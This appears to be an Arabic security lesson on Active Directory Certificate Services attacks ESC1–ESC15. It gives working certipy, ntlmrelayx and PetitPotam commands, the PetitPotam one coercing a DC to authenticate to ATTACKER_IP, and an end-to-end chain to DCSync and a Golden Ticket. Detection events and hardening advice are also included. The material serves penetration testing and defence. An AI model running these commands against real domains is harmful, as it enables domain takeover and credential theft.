# هجمات خدمات شهادات Active Directory (AD CS) — من ESC1 إلى ESC15

تعد خدمات شهادات Active Directory (AD CS) من أكثر المسارات التي يتم إغفال تدقيقها للوصول إلى صلاحيات مدير الدومين (Domain Admin) في الأعوام 2024–2026. قامت شركة SpecterOps بتصنيف 15 خطأً في التكوين (ESC1–ESC15) تتيح لمستخدم ذي صلاحيات محدودة تزوير هوية بطاقة ذكية (Smart Card) لـ **أي** حساب في النظام، بما في ذلك حساب KRBTGT. وجود خطأ واحد في تكوين قوالب الشهادات قد يجعل كافة جهود تحصين المستوى صفر (Tier-0) بلا قيمة.

> [!warning] تحذير من مستوى التأثير
> كافة الأوامر الواردة أدناه مخصصة للأغراض التعليمية في مختبرات AD أو ضمن مهام اختبار اختراق مصرح بها. إصدار شهادة تمنح صلاحية Domain Admin في بيئة إنتاجية دون تصريح يعد عملاً تدميرياً.

## لماذا تتفوق الشهادات على الـ Hashes؟

توفر شهادة المستخدم إمكانية المصادقة عبر بروتوكول Kerberos PKINIT، وهو ما يعني عدم الحاجة لكلمة مرور، أو hash NTLM، أو تجاوز MFA بشكل افتراضي. إذا امتلكت الشهادة والمفتاح الخاص لحساب `Administrator@corp.local` فأنت تملك كامل صلاحيات المدير حتى انتهاء صلاحية الشهادة (والتي تمتد غالباً من سنة إلى 10 سنوات).

تذاكر Kerberos يتم تدويرها دورياً، أما الشهادات فتبقى صالحة لفترات طويلة.


![مسار هجوم AD CS](/images/lessons/adcs_attack_flow_en.png)

## الأدوات المستخدمة

```terminal
pip install certipy-ad
# أو النسخ المكتوبة بلغة C#
git clone https://github.com/GhostPack/Certify
git clone https://github.com/GhostPack/Rubeus
```

لإجراء عملية استكشاف (Enumeration) شاملة بضربة واحدة:

```terminal
certipy find -u alice@corp.local -p 'Pass1' -dc-ip 10.0.0.1 -vulnerable -stdout
```

يقوم هذا الأمر بحصر كافة جهات إصدار الشهادات (CA)، وقوالب الشهادات (Templates)، وتحديد أي من ثغرات ESC تنطبق عليها. ينصح بتشغيل هذا الأمر في كل مهمة اختبار اختراق داخلية.

## ESC1 — قالب سيئ التكوين: ENROLLEE_SUPPLIES_SUBJECT

يسمح هذا القالب لمقدم طلب الشهادة بتحديد الاسم البديل للموضوع (SAN) ويسمح بالمصادقة كعميل (Client Authentication). يمكن طلب شهادة بصفة "مدير النظام" (Administrator).

```terminal
certipy req -u alice@corp.local -p 'Pass1' \
  -ca CORP-CA -template VulnTemplate \
  -upn administrator@corp.local -dns dc01.corp.local
# النتجية: ملف administrator.pfx

certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
# النتيجة: الحصول على NT hash الخاص بالمدير + تذكرة TGT
```

> [!danger] اختراق الدومين بضربة واحدة
> ثغرة ESC1 وحدها كافية لإنهاء اللعبة في معظم البيئات. سبل الحماية: قم بإزالة علم `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` وافرض موافقة المدير (Manager Approval) على أي قالب يسمح بتحديد SAN.

## ESC2 — تعدد أغراض الاستخدام (Any Purpose / SubCA EKU)

يمنح القالب صلاحية "أي غرض" (Any Purpose) ضمن حقل استخدام المفتاح الموسع (EKU)، مما يجعله صالحاً للمصادقة وتوقيع البرمجيات وغيرها. يتم استغلاله بنفس طريقة ESC1 إذا سُمح بحقن SAN.

## ESC3 — وكيل التسجيل (Enrollment Agent)

يسمح القالب لمستخدم ذي صلاحيات منخفضة بالتسجيل **نيابة عن مستخدمين آخرين**. يتم طلب شهادة وكيل تسجيل أولاً، ثم تُستخدم لطلب شهادة بطاقة ذكية لأي مستخدم مستهدف.

```terminal
certipy req -u alice@corp.local -p 'Pass1' -ca CORP-CA -template EnrollmentAgent
certipy req -u alice@corp.local -p 'Pass1' -ca CORP-CA -template User \
  -on-behalf-of 'CORP\administrator' -pfx alice.pfx
```

## ESC4 — صلاحيات ACL ضعيفة على القالب

امتلاك مستخدم منخفض الصلاحيات لحقوق مثل `WriteDacl` أو `WriteOwner` على كائن القالب يتيح له إعادة تعديل تكوين القالب ليصبح مطابقاً لثغرة ESC1، ثم استغلاله واستعادة التكوين الأصلي لاحقاً.

```terminal
certipy template -u alice@corp.local -p 'Pass1' -template Workstation -save-old
# يصبح القالب الآن مكافئاً لـ ESC1
certipy req ... (كما في ESC1)
certipy template -u alice@corp.local -p 'Pass1' -template Workstation -configuration Workstation.json
```

## ESC5 — صلاحيات ACL ضعيفة على كائنات PKI

نفس مبدأ ESC4 ولكن على مستوى كائن جهة الإصدار (CA) أو حاوية `NTAuthCertificates`؛ مما يزيد من نطاق التأثير ليشمل البنية التحتية للمفاتيح العامة بالكامل.

## ESC6 — تفعيل خاصية EDITF_ATTRIBUTESUBJECTALTNAME2

خيار قديم في سجل النظام (Registry) لجهة الإصدار يسمح بحقن SAN في **أي** قالب، حتى القوالب الافتراضية. قامت مايكروسوفت بتعطيله افتراضياً في 2022 ولكن لا يزال موجوداً في الأنظمة القديمة.

```terminal
certipy req -u alice@corp.local -p 'Pass1' -ca CORP-CA -template User \
  -upn administrator@corp.local
```

## ESC7 — صلاحيات إدارة جهة الإصدار (CA Management ACL)

امتلاك حقوق `ManageCA` يتيح للمهاجم الموافقة على طلباته المعلقة، أو تفعيل ESC6 في تكوين جهة الإصدار ثم استغلالها.

```terminal
certipy ca -u alice@corp.local -p 'Pass1' -ca CORP-CA -add-officer alice
certipy ca -u alice@corp.local -p 'Pass1' -ca CORP-CA -enable-template EnrollmentAgent
```

## ESC8 — ترحيل NTLM إلى واجهة التسجيل عبر الويب (AD CS Web Enrollment)

سلسلة الهجوم الشهيرة PetitPotam ← AD CS. يتم إجبار متحكم الدومين (DC) على المصادقة عبر NTLM، ثم ترحيل (Relay) هذه المصادقة إلى واجهة `/certsrv/certfnsh.asp` لطلب شهادة بطاقة ذكية بصفة حساب الكمبيوتر الخاص بالـ DC، مما يؤدي إلى تنفيذ DCSync.

```terminal
# الطرفية 1 — منصة الاستماع للترحيل
ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# الطرفية 2 — إجبار المصادقة
PetitPotam.py -u '' -p '' ATTACKER_IP DC01_IP
# (أو استخدام أدوات مثل coercer.py / dfscoerce.py)

# المخرج: ملف DC01.pfx
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1
# النتيجة: الحصول على hash الـ DC ← تنفيذ DCSync للحصول على hash krbtgt ← إصدار تذاكر ذهبية
```

> [!tip] سبل الدفاع (ESC8)
> قم بتعطيل واجهات التسجيل عبر HTTP، وافرض استخدام HTTPS مع تفعيل خاصية الحماية الموسعة للمصادقة (EPA)، واطلب ربط القنوات (Channel Binding). قم بترقيع ثغرات إجبار المصادقة (CVE-2022-26925).

## ESC9 — غياب إضافة الحماية (No Security Extension)

قالب مفعل به علم `CT_FLAG_NO_SECURITY_EXTENSION` (0x80000) مما يعني غياب إضافة SID الأمنية. إذا تمكن المهاجم من تغيير UPN لمستخدم ما (عبر GenericWrite مثلاً)، فإن المصادقة ستتم بصفة أي حساب يحمل ذلك الـ UPN حالياً.

```terminal
# المتطلب: صلاحية GenericWrite على مستخدم ضحية
certipy account -u alice@corp.local -p 'Pass1' -user victim -upn administrator
certipy req -u victim ... -template ESC9Vuln
# إعادة الـ UPN لأصله والمصادقة كمدير لنظام
```

## ESC10 — ربط الشهادات الضعيف (Weak Certificate Mapping)

يحدث عند تعطيل `StrongCertificateBindingEnforcement` في السجل، أو عندما تسمح طرق الربط باستخدام سمات ضعيفة (مثل UPN أو RFC822). يتبع نفس أسلوب هجوم تبديل UPN في ESC9.

## ESC11 — ترحيل NTLM إلى بروتوكول ICPR (RPC)

مشابه لـ ESC8 ولكن يتم عبر بروتوكول RPC على المنفذ 135 بدلاً من HTTP، مما يجعل خاصية EPA غير فعالة. يتم استخدام `certipy relay` أو `ntlmrelayx -t rpc://CA`.

## ESC12 — حفظ مفتاح جهة الإصدار الخاص في نظام الملفات

تقوم بعض جهات الإصدار بحفظ مفتاحها الخاص في ملف يمكن لمديري النظام المحليين الوصول إليه. اختراق خادم الـ CA يتيح استخراج المفتاح وإصدار شهادات "خارج الشبكة" (Offline) دون أي سجلات تدقيق.

## ESC13 — ربط معرف الكائن بالمجموعات (OID Group Link)

ربط سياسة إصدار (Issuance Policy OID) بمجموعة Universal/Global عبر `msDS-OIDToGroupLink`. طلب شهادة بهذه السياسة يمنح المهاجم عضوية في المجموعة المرتبطة خلال جلسة الشهادة.

```terminal
certipy find -u alice@corp.local -p 'Pass1' -oid-to-template-and-group
certipy req ... -template ESC13Vuln
# المصادقة تمنح عضوية في المجموعة المرتبطة، والتي غالباً ما تكون ضمن Tier-0
```

## ESC14 — ربط الشهادات عبر خاصية altSecurityIdentities

إذا ملك المهاجم صلاحية `WriteProperty` على مستخدم مستهدف، يمكنه ضبط خاصية `altSecurityIdentities` لربط شهادة يملكها هو بحساب الضحية، مما يتيح له المصادقة بصفة الضحية باستخدام تلك الشهادة.

```terminal
certipy account -u alice ... -user victim -alt 'X509:<I>DC=local,DC=corp...<S>CN=alice...'
certipy auth -pfx alice.pfx -username victim
```

## ESC15 — استغلال قوالب Schema V1 (EKUwu)

تسمح قوالب V1 بإدراج سياسات تطبيق في طلب الشهادة (CSR) تتجاوز قيم EKU المعرفة في القالب. يمكن طلب شهادة بصلاحيات SubCA أو Any-Purpose من قالب يبدو حميداً في الظاهر.

```terminal
certipy req -u alice ... -template WebServer -application-policies 'Client Authentication'
```

## سلسلة الهجوم النموذجية (End-to-End Chain)

```terminal
# 1. الاستكشاف والحصر
certipy find -u alice@corp.local -p 'Pass1' -dc-ip 10.0.0.1 -vulnerable -stdout

# 2. اختيار الهدف الأقل ضجيجاً (مثلاً ESC1 أو ESC8)
certipy req -u alice@corp.local -p 'Pass1' -ca CORP-CA -template ESC1Tmpl -upn administrator@corp.local

# 3. المصادقة واستخراج الـ NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1

# 4. تنفيذ DCSync لسحب كافة البيانات
secretsdump.py corp.local/administrator@dc01.corp.local -hashes :<NT> -just-dc

# 5. ضمان الثبات (Golden Ticket باستخدام hash الـ krbtgt)
ticketer.py -nthash <krbtgt> -domain-sid S-1-5-21-... -domain corp.local Administrator
```

## أولويات الكشف والمراقبة

| نوع البيانات (Telemetry) | ما الذي يجب البحث عنه؟ |
|-----------|----------|
| الأحداث 4886 / 4887 (طلب/إصدار شهادة) | اختلاف UPN في حقل SAN عن اسم المستخدم الذي طلب الشهادة (sAMAccountName). |
| الحدث 5145 (مصادقة NTLM عبر SMB) | محاولة مصادقة حساب خدمة من محطة عمل غير متوقعة. |
| الحدث 4624 (Cert Logon) | تسجيل دخول بشهادة أُصدرت قبل أقل من 5 دقائق بصلاحيات مدير. |
| تعديلات Schema | أي تغيير يطرأ على حقول EKU أو الأعلام (Flags) في قوالب الشهادات. |
| الوصول لعملية `lsass` | أي وصول غير اعتيادي من خارج برمجيات EDR المعتمدة. |

> [!info] نصائح دفاعية سريعة
> قم بتعطيل التسجيل عبر HTTP (ESC8)، وفرض سياسات ربط الشهادات القوية في السجل (ESC9/10/14)، واشتراط موافقة المدير على القوالب التي تسمح بـ "Subject in Request"، مع التدقيق الأسبوعي في حقوق `ManageCA`. قم بتشغيل `certipy find -vulnerable` في بيئتك قبل أن يقوم المهاجم بذلك.
